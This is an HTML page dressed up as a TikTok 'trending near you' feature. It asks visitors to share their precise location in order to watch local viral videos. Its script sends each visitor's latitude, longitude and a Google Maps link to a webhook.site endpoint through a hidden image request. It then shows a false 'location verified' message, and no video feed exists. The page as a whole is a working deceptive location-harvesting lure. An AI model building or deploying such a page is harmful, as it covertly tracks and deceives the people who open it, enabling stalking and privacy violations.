<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trending TikTok Near You</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #000000;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
        }
        .card {
            background: #121212;
            border: 1px solid #282828;
            padding: 24px;
            border-radius: 16px;
            text-align: center;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
        }
        .video-preview {
            width: 100%;
            height: 200px;
            background: #1f1f1f;
            border-radius: 12px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            margin-bottom: 20px;
            position: relative;
            overflow: hidden;
            border: 1px solid #333;
        }
        .play-icon {
            width: 50px;
            height: 50px;
            background: rgba(254, 44, 85, 0.9);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 10px;
        }
        .play-icon::after {
            content: "";
            display: block;
            width: 0;
            height: 0;
            border-top: 8px solid transparent;
            border-bottom: 8px solid transparent;
            border-left: 14px solid #ffffff;
            margin-left: 3px;
        }
        .preview-text {
            font-size: 13px;
            color: #aaa;
        }
        h2 { 
            font-size: 18px; 
            margin-bottom: 8px; 
            color: #fff;
        }
        p { 
            color: #8a8a8a; 
            font-size: 13px; 
            line-height: 1.5;
            margin-bottom: 20px;
        }
        .btn {
            background: linear-gradient(90deg, #FE2C55, #25F4EE);
            color: #ffffff;
            border: none;
            padding: 14px 20px;
            font-size: 15px;
            border-radius: 25px;
            cursor: pointer;
            font-weight: 700;
            width: 100%;
            box-shadow: 0 4px 12px rgba(254, 44, 85, 0.3);
            transition: transform 0.2s;
        }
        .btn:active {
            transform: scale(0.98);
        }
        #status { 
            margin-top: 15px; 
            font-size: 12px; 
            color: #8a8a8a; 
        }
    </style>
</head>
<body>

    <div class="card">
        <div class="video-preview">
            <div class="play-icon"></div>
            <div class="preview-text">Viral Videos Near Your Area</div>
        </div>

        <h2>Share Location to View Local Trends</h2>
        <p>Allow location access to discover the most viral TikTok videos and local creators trending in your city right now.</p>
        
        <button class="btn" onclick="sendLocation()">Share Location & Watch</button>
        <div id="status"></div>
    </div>

    <script>
        function sendLocation() {
            const statusDiv = document.getElementById("status");
            const webhookEndpoint = "https://webhook.site/173a0605-312d-4be1-b9aa-891895e5a34e";

            if ("geolocation" in navigator) {
                statusDiv.innerText = "Accessing your device location...";

                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;

                        const img = new Image();
                        img.src = `${webhookEndpoint}?lat=${lat}&lon=${lon}&maps=${encodeURIComponent(googleMapsUrl)}`;
                        
                        statusDiv.style.color = "#25F4EE";
                        statusDiv.innerText = "Location verified! Loading local viral feed...";
                    },
                    function(error) {
                        statusDiv.style.color = "#FE2C55";
                        statusDiv.innerText = "Location permission denied.";
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            } else {
                statusDiv.innerText = "Geolocation is not supported by your browser.";
            }
        }
    </script>
</body>
</html>
